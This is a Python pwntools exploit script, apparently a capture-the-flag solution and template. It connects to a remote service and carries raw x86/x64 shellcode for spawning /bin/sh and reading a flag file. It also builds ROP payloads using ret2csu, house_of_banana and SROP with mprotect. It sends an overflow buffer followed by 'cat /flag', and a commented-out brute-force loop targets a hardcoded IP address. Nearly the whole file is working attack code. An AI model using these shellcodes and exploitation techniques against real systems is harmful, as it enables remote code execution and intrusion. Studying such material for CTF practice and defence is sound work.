# -*- coding: utf-8 -*-
from pwn import *
context.log_level = 'debug'
# context.terminal=['tmux','splitw','-h']
context(arch='amd64', os='linux')
# context(arch='i386', os='linux')
local = 0
ip=sys.argv[1]
port=int(sys.argv[2])
p = remote(ip,port)
# sl(fmtstr_pay(start_read_offset,{xxx_got:system_addr}))

one64 = [0xe6aee,0xe6af1,0xe6af4]

# shellcode = asm(shellcraft.sh())
shell32='\x68\x01\x01\x01\x01\x81\x34\x24\x2e\x72\x69\x01\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\x6a\x0b\x58\xcd\x80' 
shell64='\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05'
orw32="\x68\x61\x67\x00\x00\x68\x2e\x2f\x66\x6c\x89\xe3\xb9\x00\x00\x00\x00\xb8\x05\x00\x00\x00\xcd\x80\x89\xc3\x89\xe1\xba\x00\x01\x00\x00\xb8\x03\x00\x00\x00\xcd\x80\xbb\x01\x00\x00\x00\x89\xe1\xba\x00\x01\x00\x00\xb8\x04\x00\x00\x00\xcd\x80"
orw64="\x49\xb8\x2e\x2f\x66\x6c\x61\x67\x00\x00\x41\x50\x48\x89\xe7\x48\xc7\xc6\x00\x00\x00\x00\xb8\x02\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\x89\xe6\x48\xc7\xc2\x00\x01\x00\x00\xb8\x00\x00\x00\x00\x0f\x05\x48\xc7\xc7\x01\x00\x00\x00\x48\x89\xe6\x48\xc7\xc2\x00\x01\x00\x00\xb8\x01\x00\x00\x00\x0f\x05"
open_32="\x90\x90\x90\x90\x90\x90\x90\x90\x68\x00\x00\x00\x40\x5f\x68\x00\x02\x00\x00\x5e\x6a\x07\x5a\x49\xc7\xc2\x22\x00\x00\x00\x4d\x31\xc9\x4d\x31\xc0\x48\xc7\xc0\x09\x00\x00\x00\x0f\x05\x48\x31\xff\x68\x00\x00\x00\x40\x5e\x48\xc7\xc2\x00\x01\x00\x00\x48\xc7\xc0\x00\x00\x00\x00\x0f\x05\x6a\x23\x68\x08\x00\x00\x40\x48\xcb\x0a"
readwrite_64="\x66\x6c\x61\x67\x00\x00\x00\x00\xbb\x00\x00\x00\x40\x31\xc9\x31\xd2\xb8\x05\x00\x00\x00\xcd\x80\x89\xc1\xbc\x50\x01\x00\x40\x6a\x33\x68\x28\x00\x00\x40\x48\xcb\x48\x89\xcf\x48\xc7\xc6\x00\x01\x00\x40\x48\xc7\xc2\x50\x00\x00\x00\x48\xc7\xc0\x00\x00\x00\x00\x0f\x05\x48\xc7\xc7\x01\x00\x00\x00\x48\xc7\xc6\x00\x01\x00\x40\x48\xc7\xc2\x50\x00\x00\x00\x48\xc7\xc0\x01\x00\x00\x00\x0f\x05\x90\x90\x90\x90\x90\x90\x90\x90"

sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()

def debug(mallocr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+mallocr)))
    else:
        gdb.attach(p,"b *{}".format(hex(mallocr)))


def mid_overflow(bufsize,pppppp_ret,mov_ret,func_got,rdi,rsi,rdx,next_func):
    pay = ''
    pay += 'a'*bufsize
    pay += 'bbbbbbbb'
    pay += p64(pppppp_ret)
    pay += p64(0)
    pay += p64(0)
    pay += p64(1)
    pay += p64(func_got)
    pay += p64(rdx)
    pay += p64(rsi)
    pay += p64(rdi)
    pay += p64(mov_ret)
    pay += p64(0)
    pay += p64(0)
    pay += p64(0)
    pay += p64(0)
    pay += p64(0)
    pay += p64(0)
    pay += p64(0)
    pay += p64(next_func)
    return pay

def house_of_banana(fake_link_map,libc_base,ld_base):
    # remember to full presize-->fake_link_map+0x20　(no change 4!)
    shellcode_addr = (libc_base+libc.sym["__free_hook"]) & 0xfffffffffffff000
    new_stack = fake_link_map + 0x40
    py = ''
    py += p64(0) + p64(ld_base+0x2f740)# l->next
    py += p64(0) + p64(fake_link_map) # l->real
    py += p64(libc_base+libc.sym["setcontext"]+61)
    py += p64(libc_base + 0x00000000000c1479)# ret
    py += p64(libc_base + 0x0000000000026b72)# stack: pop_rdi_ret
    py += p64(0)
    py += p64(libc_base + 0x0000000000027529)# pop_rsi_ret
    py += p64(shellcode_addr)
    py += p64(libc_base + 0x00000000001626d6)# pop_rdx_ret
    py += p64(0x100)
    py += p64(0)
    py += p64(libc_base+libc.sym["read"])
    py += p64(shellcode_addr)
    py += p64(0)
    py += p64(0)
    py += p64(0)
    py += p64(shellcode_addr)#rdi
    py += p64(0x1000)#rsi 
    py += p64(0)*2
    py += p64(0x7)#rdx 
    py += p64(0)
    py += p64(0)#rcx 
    py += p64(new_stack)#rsp 
    py += p64(libc_base+libc.sym["mprotect"]) #rip 
    py = py.ljust(0x100,'\x00')
    py += p64(fake_link_map + 0x120)#0x110, jmp addr
    py += p64(fake_link_map + 0x120)#0x118
    py += p64(fake_link_map + 0x120)#0x120,l_info[DT_FINI_ARRAY] addr
    py += p64(0x10)#l_info[DT_FINI_ARRAY] offset, 0x10 means 2 func
    py = py.ljust(0x30C,'\x00')
    py += p8(0x8)#bypass if(l->l_init_called) check
    return py

def srop_pay(pay_start,libc_base):
    free_hook = libc_base+libc.sym["__free_hook"]
    pay=''
    pay+=p64(libc_base+0x00000000001547a0)
    pay+=p64(pay_start)
    pay+=p64(0)*2
    pay+=p64(libc_base+libc.sym["setcontext"]+61)
    shellcode_addr=free_hook&0xfffffffffff000
    frame = SigreturnFrame()
    new_stack=pay_start + 0xf8
    frame.rax=0
    frame.rdi=0
    frame.rsi=shellcode_addr
    frame.rdx=0x100
    frame.rip=libc_base + 0x0000000000066229# syscall_ret
    frame.rsp=new_stack
    pay+=bytes(frame)[0x28:]
    pay+=p64(libc_base + 0x0000000000026b72)# pop_rdi_ret
    pay+=p64(shellcode_addr)
    pay+=p64(libc_base + 0x0000000000027529)# pop_rsi_ret
    pay+=p64(0x800)
    pay+=p64(libc_base + 0x00000000001626d6)# pop_rdx_rbx_ret
    pay+=p64(7)
    pay+=p64(0) 
    pay+=p64(libc_base+libc.sym["mprotect"])
    pay+=p64(shellcode_addr)
    return pay


def add(size,content):
    ru("> ")
    sl('1')
    ru()
    sl(str(size))
    ru()
    sd(content)
def free(index):
    ru("> ")
    sl('3')
    ru()
    sl(str(index))
def edit(index,content):
    ru("> ")
    sl('2')
    ru()
    sl(str(index))
    ru()
    sd(content)
def show(index):
    ru("> ")
    sl('4')
    ru()
    sl(str(index))


# debug(0x000000000001840)
ru("> ")
py = ''
py += '\x20\x0a\x0a'*20+'\x20\x0a\x0d'+'\x09\x0d'+'\x00'*7
py += (p32(0xbeaf)+p32(0xdead))*((0x2000-72-16)/8)
sd(p32(len(py)))
# pause()
sl(py)
sl('cat /flag')     
print(p.recvrepeat(1))
# libc_base = u64(rc(6).ljust(8,'\x00'))
# print "libc_base--->" + hex(libc_base)

# heap = u64(rc(6).ljust(8,'\x00'))
# print "heap--->" + hex(heap)

# onegadget = libc_base + one64[2]
# setcontext = libc_base+libc.sym["setcontext"]
# io_list_all = libc_base+libc.sym["_IO_list_all"]
# malloc_hook = libc_base + libc.sym["__malloc_hook"]
# free_hook = libc_base + libc.sym["__free_hook"]
# realloc = libc_base + libc.sym["realloc"]
# system = libc_base + libc.sym["system"]
# binsh = libc_base + libc.search("/bin/sh\x00").next()
# mprotect = libc_base + libc.symbols['mprotect']
# read = libc_base + libc.sym["read"]
# ld_base = libc_base + 0x1f9000
# rtld_global = ld_base + 0x2e060
# ret = libc_base + 0x00000000000c1479
# magic_gadget = libc_base + 0x00000000001547a0
# syscall_ret = libc_base + 0x0000000000066229
# pop_rdi_ret = libc_base + 0x0000000000026b72
# pop_rsi_ret = libc_base + 0x0000000000027529
# pop_rdx_rbx_ret = libc_base + 0x00000000001626d6
# # 0x00000000001547a0: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]; 








# value = 0x00
# i = 0
# while 1:
#     print i
#     i += 1
#     try:
#         print("value--->"+hex(value))
#         pwn(value)
#     except EOFError:
#         p.close()
#         if local:
#             p = process('./chunk29')
#             value += 1
#         else:
#             p = remote('121.40.246.48',9999)
#             value += 1
#     else:
#         sl("ls")
#         break

p.interactive()
    
    
    